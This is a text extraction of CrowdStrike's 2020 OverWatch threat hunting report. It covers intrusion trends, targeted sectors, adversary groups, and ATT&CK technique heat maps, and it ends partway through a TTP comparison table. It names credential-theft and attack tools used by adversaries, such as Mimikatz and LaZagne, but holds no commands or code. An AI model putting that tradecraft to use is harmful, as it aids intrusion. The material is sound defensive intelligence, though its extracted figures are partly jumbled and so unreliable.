NOWHERE
TO HIDE
2020 THREAT
HUNTING REPORT

INSIGHTS FROM THE
CROWDSTRIKE OVERWATCH TEAM

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

2

TABLE OF CONTENTS
3

INTRODUCTION

23

INTRUSION HIGHLIGHTS

23

HUNTING THWARTS LABYRINTH CHOLLIMA
ATTACK LAUNCHED OVER SOCIAL MEDIA
PANDA ABUSES GITHUB SERVICE FOR COVERT
C2
TRACER KITTEN EXPLOITS CUSTOM BACKDOORS
TO BREACH A TELECOMMUNICATIONS
COMPANY
BACKDOORED SSH SERVICE USED TO COLLECT
CREDENTIALS FROM A TECHNOLOGY COMPANY
SPIDER USES UNCOMMONLY SEEN TRADECRAFT
IN AN ATTEMPT TO ESTABLISH FOOTHOLD IN A
VICTIM’S ENVIRONMENT

4

OVERWATCH SEARCH HUNTING
METHODOLOGY

27

6

INTRUSION CAMPAIGN SUMMARY

32

6
7
8
13

INTRUSION CAMPAIGN NUMBERS
ADVERSARY THREAT TYPES
CAMPAIGNS BY VERTICAL
ADVERSARIES BY VERTICAL

35

15

INTRUSION TACTICS AND TECHNIQUES

15

ADVERSARY TOOLS USED IN INTERACTIVE
INTRUSIONS
TACTICS AND TECHNIQUES OBSERVED IN
INTERACTIVE INTRUSIONS
COMPARING TTPS BETWEEN ECRIME
AND STATE-SPONSORED ADVERSARIES

17
20

38

41

CONCLUSION

42

RECOMMENDATIONS

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

3

INTRODUCTION
Falcon OverWatchTM is the CrowdStrike® managed threat hunting service built
on the CrowdStrike Falcon® platform. OverWatch provides deep and continuous
human analysis on a 24/7 basis to relentlessly hunt for anomalous or novel attacker
tradecraft designed to evade other detection techniques.
OverWatch comprises an elite team of cross-disciplinary specialists that harness
the massive power of the CrowdStrike Threat Graph®, enriched with CrowdStrike
threat intelligence, to continuously hunt, investigate and advise on sophisticated
threat activity in customer environments. Armed with cloud-scale telemetry of
over 3 trillion endpoint events collected per week, and detailed tradecraft on 140
adversary groups, OverWatch has the unparalleled ability to see and stop the most
sophisticated threats, leaving adversaries with nowhere to hide1.
This report provides a summary of OverWatch’s threat hunting findings from the first
half of 2020. It reviews intrusion trends during that time frame, provides insights
into the current landscape of adversary tactics and delivers highlights of notable
intrusions OverWatch identified. The report’s findings relate to the targeted and
interactive intrusions that OverWatch tracks and are not necessarily representative
of the full spectrum of attacks that are stopped by the Falcon platform.

1 For more information on how Falcon OverWatch performs its mission, please see https://www.crowdstrike.com/endpoint-security-products/falconoverwatch-threat-hunting/.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

4

OVERWATCH SEARCH HUNTING METHODOLOGY
OverWatch threat hunting exists with the express purpose of finding threats that
technology on its own cannot. For the first time, this report is pulling back the curtain to
reveal the methodology that sits behind the human-driven search engine that is Falcon
OverWatch. Working around the clock, the OverWatch team employs the “SEARCH”
hunting methodology to detect threats at scale. Using SEARCH, OverWatch threat
hunters methodically sift through a world of unknown unknowns to find the faintest
traces of malicious activity and deliver actionable analysis to CrowdStrike customers
in near real time. The OverWatch SEARCH methodology shines a light into the darkest
corners of customers’ environments — leaving adversaries with nowhere to hide.

OVERWATCH SEARCH
Threat Hunting Methodology

SENSE

ENRICH

ANALYZE

RECONSTRUCT COMMUNICATE

HONE

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

5

SENSE
CrowdStrike’s rich telemetry creates the foundation for OverWatch threat hunting. Over 3 trillion
events per week, comprising hundreds of event types from millions of endpoints, are collected
and catalogued by the Falcon platform to provide comprehensive visibility into activity across
the CrowdStrike install base.

ENRICH
CrowdStrike's proprietary Threat Graph contextualizes events and reveals relationships
between data points in real time. Threat hunters add a further dimension to the data by drawing
on up-to-the-minute threat intelligence about the tradecraft of more than 140 adversary groups,
as well as their intimate working knowledge of the tactics, techniques and procedures (TTPs) in
use in the wild. All of this is underpinned by OverWatch’s proprietary tools and processes, which
ensure every hunt is optimized for maximum efficiency.

ANALYZE
OverWatch analysts use complex statistical methods to identify anomalous activity. This is
supported by a deep understanding of adversary behaviors and motivations, enabling the team
to form hypotheses about where adversaries may strike. The breadth and depth of experience
on the OverWatch team is world-class, with representation from every corner of public and
private industry. Further, the team is continuously building its knowledge base, going toe-to-toe
with adversaries on the front line, 24/7/365.

RECONSTRUCT
In order to take action against an adversary, it is critical to understand the full nature of the
threat. In just minutes, OverWatch analysts reconstruct threat activity, transforming it from a
collection of data points into a clear story. This information empowers organizations to not only
remediate but also plug the gaps in their environment.

COMMUNICATE
Time is of the essence in preventing an intrusion from becoming a breach. OverWatch operates
as a native component of the Falcon platform. Through Falcon, OverWatch delivers clear,
accurate and actionable information on potentially malicious activity in near real time, enabling
organizations to respond quickly and decisively, without friction.

HONE
With each new threat, OverWatch extracts new insights to drive continuous improvements in
automated detections and human threat hunting. The team is consistently fine-tuning its skills
and process to always stay a step ahead of the adversary.
Through the use of the SEARCH methodology, OverWatch was able to help organizations prevent
more than 41,000 potential breaches in the first half of 2020.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

6

INTRUSION CAMPAIGN SUMMARY
INTRUSION CAMPAIGN NUMBERS
In the first half of 2020, there was a sharp rise in cyber activity tracked by
OverWatch.

Figure 1: Increase in the number of potential intrusions identified by OverWatch in 2020

1st Half 2020
Cumulative
Potential
Intrusions
Identified
by Falcon
OverWatch

41,000

2019

35,000

40k

30k

20k

10k

JAN

APR

JUL

DEC

In the six months from January to June, OverWatch observed more hands-on-keyboard
intrusions than were seen throughout all of 2019. This increase appears to be driven
predominantly by the continued acceleration of eCrime activity. However, the rapid
adoption of remote work practices and the accelerated setup of new infrastructure by
many companies — driven by the COVID-19 pandemic — also contributed to an everincreasing attack surface for motivated adversaries. Additionally, the pandemic created
opportunities for adversaries to exploit public fear through the use of COVID-19-themed
1st Half 2020
2019
social engineering strategies.

41,000

35,000

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

7

Figure 2: Distribution of intrusion threat types observed by OverWatch from Q1 2019
through Q2 2020

INTRUSIONS BY THREAT TYPE

eCRIME

UNATTRIBUTED
STATE-SPONSORED
Q1 2019

Q2 2019

Q3 2019

Q4 2019

Q1 2020

Q2 2020

ADVERSARY THREAT TYPES
In 2020, eCrime continues to dominate the intrusions uncovered by OverWatch threat
hunters. The increase in sophisticated eCrime activity relative to state-sponsored
activity is a trend that OverWatch has seen accelerate over the last three years2. Last
year’s OverWatch mid-year report revealed that for the first time, the frequency of
eCrime activity surpassed state-sponsored activity.
In the first half of 2020, eCrime activity well and truly outpaced state-sponsored activity,
making up 82% of interactive intrusions observed by OverWatch. Put another way, for
each state-sponsored campaign uncovered by an OverWatch analyst, the team sees
approximately four eCrime intrusions. A likely explanation is that eCrime actors continue
to achieve enormous success with “big game hunting” (BGH) campaigns, and the
availability of commodity malware through ransomware-as-a-service (RaaS) models has
contributed to a proliferation of activity from a wider array of eCrime actors3.

2 These numbers represent cases where attribution has been possible. OverWatch partners with the CrowdStrike Intelligence team to analyze adversaries
performing intrusion activity. Attribution to a high degree of confidence is not always immediately possible, resulting in several OverWatch intrusion cases
remaining officially unattributed and therefore excluded from this reporting.
3 eCrime actors’ use of commodity malware and the continued growth of big game hunting are further explained and detailed in the 2020 CrowdStrike
Global Threat Report, available at https://www.crowdstrike.com/resources/reports/2020-crowdstrike-global-threat-report/.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

8

Figure 3: Relative prevalence of state-sponsored and eCrime intrusions in interactive activity tracked by OverWatch, first half of 2020
compared to 2019

StateSponsored

StateSponsored

18%

% JAN TO JUN 2020

eCrime

82%

31%

% JAN TO DEC 2019

eCrime

69%
CAMPAIGNS BY VERTICAL
As noted, there has been a significant increase in interactive intrusion activity in 2020.
Figure 4 shows the top 10 most frequently impacted industry verticals in the first half of
2020, as observed by OverWatch.
Some trends from OverWatch’s recent reporting have held firm; in particular, the
technology, telecommunications and financial industries have remained among the most
frequently targeted sectors. In contrast, the manufacturing industry has experienced a
dramatic increase in interactive intrusion activity compared to past years. From January
to June 2020, manufacturing was the second most frequently targeted industry vertical.
In comparison, it was not in the top 10 in 2019.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

IN FOCUS:20%MANUFACTURING

9

RELATIVE FREQUENCY OF INTRUSIONS, JAN TO JUN 2020
RELATIVE FREQUENCY OF INTRUSIONS, 2019

19.2%
The escalation of activity
in the manufacturing sector has occurred in terms of both the quantity and sophistication of
17.5%
the intrusions. Among the intrusions uncovered this year, OverWatch has observed a state-sponsored actor employing
novel techniques to deploy tooling within a victim environment. Threat hunters have also uncovered examples of
15%
eCrime actors adapting and evolving their TTPs to maximize impact.

A feature of the manufacturing threat landscape is that it is among only a handful of industries that OverWatch
11.1%both state-sponsored and eCrime adversaries. The often-critical nature of manufacturing
routinely sees targeted by
operations
and
the
valuable
data that many manufacturing businesses hold make the industry an enticing target for
10%
adversary groups seeking to extract
8.9%value and further their strategic objectives.
For a deep dive into observations in the7.0%
manufacturing industry in 2020, see this OverWatch blog on the subject:
https://www.crowdstrike.com/blog/adversaries-targeting-the-manufacturing-industry/.
5.7%
5.4%
5%

4.6%

5.3%

3.8%

3.3%

5.0%

3.3%

3.3%

3.3%

2.5%
1.7%

1.6%

0%

Technology

Manufacturing

Financial

Healthcare

Academic

Food
& Beverage

Retail

Hospitality

Figure 4: Top 10 most frequently impacted industry verticals in the first half of 2020

1.0%

0.6%

NGO
(Inc. Think
Tanks)

Aviation

TOP 10 VERTICALS BY INTRUSION FREQUENCY, JAN TO JUN 2020
Technology

18%

Manufacturing

11%

Telecommunications

10%

Financial

9%

Healthcare

6%

Academic

5%
5%

Professional Services
Government

4%

Food & Beverage

4%

Engineering

4%
0%

4%

8%

12%

16%

20%

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

10

INTRUSIONS BY REGION (TOP 10 VERTICALS)
Figure 5 provides a snapshot of the geographical spread of interactive intrusion activity
in the top 10 most frequently impacted industry verticals. Evidence of hands-on intrusion
in every region around the world serves to demonstrate that cyberattacks are not a
problem for just one country or just one industry. The motivations and incentives for
cyber adversaries are as diverse as the organizations they attack.

Figure 5: Geographical distribution of intrusions in the top 10 most frequently impacted
industry verticals, January-June 2020

Vertical

Technology
Manufacturing
Telecommunications
Financial
Healthcare
Academic
Professional Services
Government
Food & Beverage
Engineering

APAC
Asia Pacific

EMEA
Europe,
Middle East
and Africa

North
America

South and
Central
America

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

11

INTERACTIVE ATTACKS AT PANDEMIC PROPORTIONS
In addition to the overall spike in interactive intrusion activity, OverWatch has seen some
interesting fluctuations in the frequency of activity in some industry verticals. While the
sample size makes it difficult to draw any absolute conclusions about the cause of these
fluctuations, there are certainly some notable changes. Figure 6 shows the industries
that have seen the biggest variation in frequency of interactive activity, relative to 2019.

Figure 6: Industry verticals that have experienced the most significant change in intrusion frequency in 2019 and the first half of 2020

20%

RELATIVE FREQUENCY OF INTRUSIONS, JAN TO JUN 2020
RELATIVE FREQUENCY OF INTRUSIONS, 2019

19.2%
17.5%
15%

11.1%
10%

8.9%
7.0%
5.7%

5.4%

5%

4.6%

5.3%

3.8%

3.3%

5.0%

3.3%

3.3%

3.3%

2.5%
1.7%

1.6%

0%

Technology

Manufacturing

Financial

Healthcare

Academic

Food
& Beverage

Retail

Hospitality

1.0%

0.6%

NGO
(Inc. Think
Tanks)

Aviation

The changes observed in the frequency with which these industries fell victim to
intrusion activity in the first half of 2020 could indicate that adversaries have adjusted
their targets in response to the rapidly shifting economic conditions driven by the
COVID-19 pandemic. The healthcare, manufacturing, and food and beverage industries
all saw spikes in interactive intrusion activity. It is reasonable to surmise that these
industries in particular have experienced a more complex operating environment during
18%
the pandemic due to supply chain disruptions and dramatic changes in demand. On
both counts this may have contributed to a perception that these sectors may be
11%
more inclined to pay a ransom to prevent further disruption. There are also a range of
reasons why state-sponsored adversaries may see these sectors as valuable targets.
10%
International trade tensions, increased competition for essential goods, and efforts by
some firms to decrease their reliance on offshore suppliers could all have contributed to
9%
increased foreign interest in the operations of firms in these sectors.

TOP 10 VERTICALS BY INTRUSION FREQUENCY, JAN TO JUN 2020
Technology
Manufacturing
Telecommunications
Financial
Healthcare

6%

Academic

5%

Professional Services

5%

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

12

It is also interesting to look at the sectors that experienced a decline in interactive
intrusion activity — among them aviation, retail and hospitality. These are among the
industries that were hit hardest by widespread “stay-at-home” directives. The slowdown
in these sectors may have contributed to them being seen as less attractive targets,
particularly for financially motivated adversaries.

IN FOCUS: HEALTHCARE
In recent months, the world has witnessed the global COVID-19 pandemic place unprecedented pressure on global
healthcare systems. Concurrently, the pandemic has been the catalyst for a paradigm shift in the way organizations
operate, with many businesses scrambling to stand up a remote workforce. This has created a perfect storm for
adversaries to launch attacks against an overstretched healthcare industry.
Of the interactive healthcare intrusions observed in the first half of 2020 where attribution was possible, around 75%
were attributed to eCrime, despite some criminal actors having committed publicly to not attacking the healthcare
industry. The remaining intrusions have been attributed to state-sponsored actors and may have been driven in part by
the global race to find a cure for the COVID-19 virus.
For a deep dive into observations in the healthcare industry in 2020, see this OverWatch blog on the subject: https://
www.crowdstrike.com/blog/how-threat-hunting-uncovers-covid-19-healthcare-attacks.

VERTICALS TO WATCH
With the effects of the global health and economic crisis far from over, it remains to be
seen how the cybersecurity landscape will adjust to this new normal. In addition to the
changes described, OverWatch has observed early indications of an uptick in activity
in the agricultural industry, which may indicate that adversaries are responding to the
second-order effects of the pandemic, including heightened trade tensions and food
security concerns. What is clear is that where there is opportunity, cyber adversaries
are ready to strike. With the surge in interactive intrusion activity seen in 2020, it is
more important than ever that businesses across all industry sectors assume a strong
security posture.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

13

ADVERSARIES BY VERTICAL
Adversary Group
Naming Convention
Adversary

Nation-state or
Category

CHOLLIMA

Democratic
People’s Republic
of Korea (DPRK,
North Korea)

KITTEN

Iran

PANDA

People’s Republic
of China

SPIDER

eCrime

OverWatch mapping of adversary activity by industry vertical serves to reinforce
how prolific eCrime (aka SPIDER) activity has been in the first half of 2020. The
representation of SPIDER adversaries across verticals widened significantly compared
to past years. The 2019 mid-year report documented hands-on-keyboard SPIDER
campaigns across 13 industries. In the first half of 2020, OverWatch has already
observed such SPIDER campaigns in 27 distinct industries — more than double this time
last year.
The data also reveals the scope of state-sponsored activity over the past six months.
The agriculture, healthcare, media, technology and telecommunications industries were
all the targets of state-sponsored campaigns originating from more than one country.
A particular standout from the data relates to the telecommunications industry, which
continues to be a popular target for state-sponsored adversaries. OverWatch observed
six distinct known PANDA actors conducting campaigns against telecommunications
companies in the first half of 2020.
The heat map in Figure 7 shows which adversary groups were active in particular
industry verticals. The darker color represents a higher number of known actors within
that country grouping being active within a particular vertical. The heat mapping is not
indicative of the total number of intrusions within a vertical, as multiple intrusions by
the same adversary group are only represented once. It is also important to note that
attribution to a high degree of confidence is not always possible, and this heat map does
not reflect unattributed activity.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

14

HEAT MAP OF INTRUSIONS BY VERTICAL AND ADVERSARY GROUP

Figure 7: Prevalence of threat actor groups by industry vertical, January-June 2020

ADVERSARY

VERTICAL
Academic
Aerospace
Agriculture
Automotive
Education
Energy
Engineering
Entertainment
Financial
Food & Beverage
Gaming
Government
Healthcare
Hospitality
Insurance
Legal
Manufacturing
Marketing
Media
Mining
Non-Profit
Oil & Gas
Pharmaceutical
Professional Services
Retail
Technology
Telecommunications
Transportation & Logistics

CHOLLIMAS
N. Korea

KITTENS
Iran

PANDAS
China

SPIDERS
eCrime

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

15

INTRUSION TACTICS AND TECHNIQUES
ADVERSARY TOOLS USED IN INTERACTIVE INTRUSIONS
The use of native host tools to conduct an intrusion — also known as “living off the land”
— is a popular choice for hands-on-keyboard adversaries attempting to avoid detection4.
By using legitimate tools already installed on the victim host, malicious activity can be
hidden in plain sight. This underscores the importance of human-driven, managed threat
hunting, which sifts out the malicious from the innocuous to rapidly identify these sorts
of stealthy intrusions.
OverWatch closely tracks adversary use of non-native administrative tools — that
is, otherwise legitimate administration tools not already native to the host operating
system. Figure 8 depicts those most commonly seen in the first half of 2020, listed in
order of prevalence.
Figure 8: Non-native tools commonly
seen in the first half of 2020

Legitimate Non-Native Tools Used
by Interactive Adversaries (in Order
of Prevalence), January–June 2020

4

1

Process Hacker

2

ProcDump

3

Advanced IP Scanner

4

TeamViewer

5

Advanced Port Scanner

6

IObit Unlocker

7

PowerTool

8

PC Hunter

9

GMER

10

AnyDesk

For example, see https://www.crowdstrike.com/blog/going-beyond-malware-the-rise-of-living-off-the-land-attacks/.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

16

The most common penetration-testing tools observed by OverWatch during the first six
months of 2020 are listed in Figure 9. Tools typically associated with penetration testing
remain popular with interactive adversaries. They are easy to acquire, powerful and so
ubiquitous that their use does not easily lead to identifying the perpetrator. As a result,
OverWatch expects them to remain a popular choice in adversaries’ arsenals.
Figure 9: Pen-testing tools commonly
seen in the first half of 2020

Pen-Testing Tools Used in
Interactive Intrusions (in Order of
Prevalence), January–June 2020
1

Mimikatz

2

Cobalt Strike

3

PowerShell Empire

4

PowerSploit

5

Meterpreter

6

LaZagne

7

SharpHound

8

Powerkatz

9

PowerCat

10

Rubeus

Figure 10 shows the most common ransomware observed by OverWatch in interactive
eCrime attacks during the first half of 2020.
Figure 10: The most frequently seen ransomware types in
interactive eCrime intrusions, January-June 2020

Makop
REvil/
Sodinoki

Medusa
Locker

Phobos

Dharma

TOP 5 RANSOMWARE
TYPES IDENTIFIED IN
INTERACTIVE INTRUSIONS
(RELATIVE PREVALENCE)

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

17

TACTICS AND TECHNIQUES OBSERVED IN INTERACTIVE
INTRUSIONS
The Falcon OverWatch team uses the MITRE ATT&CK® matrix as a framework to
categorize and track adversary behavior5. In July 2020, MITRE released the latest
version of the ATT&CK matrix (v7), which in addition to a number of new techniques now
includes sub-techniques, which will allow for activity to be tracked at a more granular
level6. Because this report relates to the first half of 2020, the activity is mapped to
the version of the ATT&CK matrix that was current at the time of the intrusions (v6.3).
Future reporting will call out any substantive changes in how OverWatch is tracking
adversary activity and highlight any impact on the comparability of data over time.

2020 ATT&CK HEAT MAP
Figure 11 is a heat map of the adversary tactics and techniques that OverWatch threat
hunters have seen across all hands-on-keyboard intrusion campaigns during the first
half of 2020. The techniques observed largely mirror the activity observed throughout
2019. However, one trend emerging in early 2020 is the increased use of discovery
techniques. In particular, security software discovery was observed being employed by
eCrime adversaries three times as frequently as it was throughout 2019. This suggests
that criminally motivated adversaries are employing more sophisticated methods when
trying to understand their victims and evade defense — in contrast to the “smash and
grab” attacks seen more commonly in past years. OverWatch also continues to routinely
see valid credentials exploited to further actions on objectives, reinforcing how crucial
it is for every organization to enforce strong password policies, including the use of
multifactor authentication. Just as importantly, as illustrated in Figure 11, adversaries
continue to employ a wide variety of techniques in the pursuit of their objectives — and
accordingly, there is no single “silver bullet” for mitigating cyber threats.

5

More information about MITRE's ATT&CK matrix is available online at https://attack.mitre.org/.

6	Further details about the ATT&CK v7 updates are outlined online at https://attack.mitre.org/resources/updates/ and future OverWatch reporting will
incorporate the new sub-technique structure.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

18

Figure 11: The most commonly observed TTPs in interactive intrusions tracked by OverWatch, January-June 2020

Ini$al Access

Execu$on

Persistence

Privilege Escala$on

Defense Evasion

Creden$al Access

Discovery

Valid Accounts

Command-Line Interface

Valid Accounts

Valid Accounts

Valid Accounts

Creden6al Dumping

Account Discovery

Exploit Public-Facing Applica6on

Scrip6ng

Web Shell

Web Shell

Scrip6ng

Brute Force

System Owner/Use

External Remote Services

PowerShell

Create Account

Process Injec6on

Disabling Security Tools

Account Manipula6on

Remote System Dis

Spearphishing APachment

Windows Management Instrumenta6on

Account Manipula6on

Scheduled Task

Masquerading

Creden6als in Files

System Network Co

Spearphishing Link

Rundll32

Scheduled Task

Accessibility Features

Indicator Removal on Host

Bash History

System Network Co

Spearphishing via Service

Scheduled Task

Accessibility Features

New Service

Modify Registry

Creden6als in Registry

File and Directory D

Supply Chain Compromise

Graphical User Interface

New Service

Bypass User Account Control

Rundll32

Input Capture

System Informa6on

Trusted Rela6onship

Service Execu6on

Registry Run Keys / Startup Folder

Exploita6on for Privilege Escala6on

Obfuscated Files or Informa6on

Creden6als from Web Browsers

Process Discovery

Drive-by Compromise

Regsvr32

Modify Exis6ng Service

Image File Execu6on Op6ons Injec6on

Process Injec6on

Kerberoas6ng

Permission Groups

Hardware Addi6ons

Mshta

External Remote Services

Sudo

File Dele6on

Private Keys

Network Service Sc

Replica6on Through Removable Media

User Execu6on

Hidden Files and Directories

DLL Search Order Hijacking

Regsvr32

Steal Web Session Cookie

Network Share Disc

Exploita6on for Client Execu6on

Image File Execu6on Op6ons Injec6on

Access Token Manipula6on

Connec6on Proxy

Network Sniﬃng

Domain Trust Disco

Trusted Developer U6li6es

BITS Jobs

Setuid and Setgid

Exploita6on for Creden6al Access

Query Registry

Local Job Scheduling

DLL Search Order Hijacking

AppInit DLLs

Deobfuscate/Decode Files or
Informa6on
Mshta

Forced Authen6ca6on

System Service Disc

Third-party SoUware

Setuid and Setgid

Parent PID Spooﬁng

Process Hollowing

Hooking

Security SoUware D

Regsvcs/Regasm

Local Job Scheduling

Service Registry Permissions Weakness

Hidden Window

Input Prompt

System Time Discov

Component Object Model and
Distributed COM
Execu6on through API

Redundant Access

AppCert DLLs

Network Share Connec6on Removal

Keychain

SoUware Discovery

.bash_proﬁle and .bashrc

Applica6on Shimming

Bypass User Account Control

LLMNR/NBT-NS Poisoning and Relay

Password Policy Dis

Execu6on through Module Load

AppInit DLLs

Dylib Hijacking

Hidden Users

Password Filter DLL

Network Sniﬃng

InstallU6l

Logon Scripts

Elevated Execu6on with Prompt

Hidden Files and Directories

Securityd Memory

Peripheral Device D

AppleScript

Netsh Helper DLL

Emond

Two-Factor Authen6ca6on Intercep6on

Applica6on Window

CMSTP

Oﬃce Applica6on Startup

Extra Window Memory Injec6on

File and Directory Permissions
Modiﬁca6on
Timestomp

Compiled HTML File

Screensaver

File System Permissions Weakness

Compile AUer Delivery

Control Panel Items

Service Registry Permissions Weakness

Hooking

Image File Execu6on Op6ons Injec6on

Dynamic Data Exchange

Windows Management Instrumenta6on
Event Subscrip6on
AppCert DLLs

Launch Daemon

Web Service

Launchctl

Path Intercep6on

BITS Jobs

LSASS Driver

Applica6on Shimming

Plist Modiﬁca6on

DLL Search Order Hijacking

Signed Binary Proxy Execu6on

Authen6ca6on Package

Port Monitors

DLL Side-Loading

Signed Script Proxy Execu6on

Bootkit

PowerShell Proﬁle

Exploita6on for Defense Evasion

Source

Browser Extensions

SID-History Injec6on

Trusted Developer U6li6es

Space aUer Filename

Change Default File Associa6on

Startup Items

Access Token Manipula6on

Trap

Component Firmware

Sudo Caching

Windows Remote Management

Component Object Model Hijacking

Redundant Access

XSL Script Processing

Dylib Hijacking

NTFS File APributes

Emond

Regsvcs/Regasm

File System Permissions Weakness

Code Signing

Hooking

Group Policy Modiﬁca6on

Hypervisor

HISTCONTROL

Kernel Modules and Extensions

Indicator Removal from Tools

Launch Agent

InstallU6l

Launch Daemon

Parent PID Spooﬁng

Launchctl

Rootkit

LC_LOAD_DYLIB Addi6on

SoUware Packing

Login Item

Template Injec6on

LSASS Driver

Binary Padding

Path Intercep6on

CMSTP

Plist Modiﬁca6on

Compiled HTML File

Port Knocking

Component Firmware

Port Monitors

Component Object Model Hijacking

PowerShell Proﬁle

Control Panel Items

Rc.common

DCShadow

Re-opened Applica6ons

Execu6on Guardrails

Security Support Provider

Extra Window Memory Injec6on

Server SoUware Component

File System Logical Oﬀsets

Shortcut Modiﬁca6on

Gatekeeper Bypass

SIP and Trust Provider Hijacking

Indicator Blocking

Startup Items

Indirect Command Execu6on

System Firmware

Install Root Cer6ﬁcate

Systemd Service

Launchctl

Time Providers

LC_MAIN Hijacking

Trap

Plist Modiﬁca6on

Winlogon Helper DLL

Port Knocking

Clear Command History

Process Doppelgänging
Signed Binary Proxy Execu6on
Signed Script Proxy Execu6on
SIP and Trust Provider Hijacking
Space aUer Filename
Virtualiza6on/Sandbox Evasion
XSL Script Processing

Browser Bookmark

Virtualiza6on/Sand

owsers

e

al Access

g and Relay

on Intercep6on

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

19

Discovery

Lateral Movement

Collec$on

Command And Control

Exﬁltra$on

Impact

Account Discovery

Remote Desktop Protocol

Data from Local System

Remote File Copy

Data Compressed

Data Encrypted for Impact

System Owner/User Discovery

Remote File Copy

Data Staged

Commonly Used Port

Inhibit System Recovery

Remote System Discovery

Windows Admin Shares

Data from Network Shared Drive

Standard Applica6on Layer Protocol

Exﬁltra6on Over Command and Control
Channel
Exﬁltra6on Over Alterna6ve Protocol

System Network Conﬁgura6on Discovery Remote Services

Data from Informa6on Repositories

Remote Access Tools

Data Encrypted

System Shutdown/Reboot

System Network Connec6ons Discovery

Third-party SoUware

Input Capture

Uncommonly Used Port

Automated Exﬁltra6on

Resource Hijacking

File and Directory Discovery

Pass the Hash

Screen Capture

Connec6on Proxy

Data Transfer Size Limits

Run6me Data Manipula6on

System Informa6on Discovery

Automated Collec6on

Custom Command and Control Protocol

Clipboard Data

Standard Cryptographic Protocol

Exﬁltra6on Over Other Network
Medium
Exﬁltra6on Over Physical Medium

Account Access Removal

Process Discovery

Component Object Model and
Distributed COM
Logon Scripts

Permission Groups Discovery

AppleScript

Audio Capture

Web Service

Scheduled Transfer

Defacement

Network Service Scanning

Applica6on Deployment SoUware

Data from Removable Media

Data Encoding

Disk Content Wipe

Network Share Discovery

Exploita6on of Remote Services

Email Collec6on

Data Obfusca6on

Disk Structure Wipe

Domain Trust Discovery

Internal Spearphishing

Man in the Browser

Standard Non-Applica6on Layer Protocol

Endpoint Denial of Service

Query Registry

Pass the Ticket

Video Capture

Domain Fron6ng

Firmware Corrup6on

System Service Discovery

Replica6on Through Removable Media

Mul6-hop Proxy

Network Denial of Service

Security SoUware Discovery

Shared Webroot

Mul6layer Encryp6on

Stored Data Manipula6on

System Time Discovery

SSH Hijacking

Communica6on Through Removable
Media

TransmiPed Data Manipula6on

SoUware Discovery

Taint Shared Content

Custom Cryptographic Protocol

Password Policy Discovery

Windows Remote Management

Domain Genera6on Algorithms

Network Sniﬃng

Fallback Channels

Peripheral Device Discovery

Mul6-Stage Channels

Applica6on Window Discovery

Mul6band Communica6on

Browser Bookmark Discovery

Port Knocking

Virtualiza6on/Sandbox Evasion

Service Stop

Data Destruc6on

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

20

COMPARING TTPS BETWEEN eCRIME
AND STATE-SPONSORED ADVERSARIES
Figure 12 shows the overlap and divergence in techniques used by eCrime and statesponsored adversaries in interactive intrusions the first half of 2020. The table only
reflects those intrusions where attribution was possible, and therefore not all of the
techniques represented in Figure 11 are reflected in Figure 12.
The divergence in initial access techniques is indicative of one of the key differences
between eCrime and state-sponsored adversaries. The former are more inclined
toward opportunistic activity, whereas the latter are more likely to methodically pursue
a specific target. Figure 12 illustrates state-sponsored adversaries’ willingness to
play the long game to gain access to a target environment — for example, through
the calculated use of social engineering to conduct spear-phishing via a service. It is
also evident in the premeditation that goes into a supply chain compromise or gaining
access via a trusted relationship.
The differences between these two threat types are also evident when looking
at the impact of intrusions. The financial motivations of eCrime actors are clearly
demonstrated, with ransomware and cryptocurrency-mining techniques being
attributed only to this category of actors in the intrusions observed by OverWatch.
On the other hand, the runtime data manipulation technique is only attributed to
state-sponsored adversaries. Techniques that impact the integrity of enterprise data
are much more akin to traditional state-sponsored espionage activity and are more
difficult to monetize for financially motivated adversaries.
Despite these differences, the core trend is the commonality in techniques employed
between these two threat types. CrowdStrike has previously reported on the
blurring of lines between eCrime and state-sponsored activity, and this is illustrated
by Figure 12. Today’s eCrime groups operate like businesses, always looking for
opportunities to adapt to circumvent new security measures, or to innovate to boost
their profit margins. No firm in any industry should consider themselves immune
from sophisticated or persistent cyber threats — regardless of whether they consider
eCrime or state-sponsored adversaries to be their bigger threat.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

21

Figure 12: A comparison of the TTPs used by state-sponsored and eCrime actors in interactive intrusions
tracked by OverWatch, January-June 2020

Ini$al Access

Execu$on

Persistence

Privilege Escala$on

Defense Evasion

Creden$al Access

Discovery

Exploit Public-Facing Applica3on

Command-Line Interface

Accessibility Features

Access Token Manipula3on

Access Token Manipula3on

Account Manipula3on

Account Discovery

External Remote Services

Graphical User Interface

Account Manipula3on

Accessibility Features

BITS Jobs

Bash History

Domain Trust Disco

Spearphishing AMachment

Local Job Scheduling

BITS Jobs

Bypass User Account Control

Bypass User Account Control

Brute Force

File and Directory

Valid Accounts

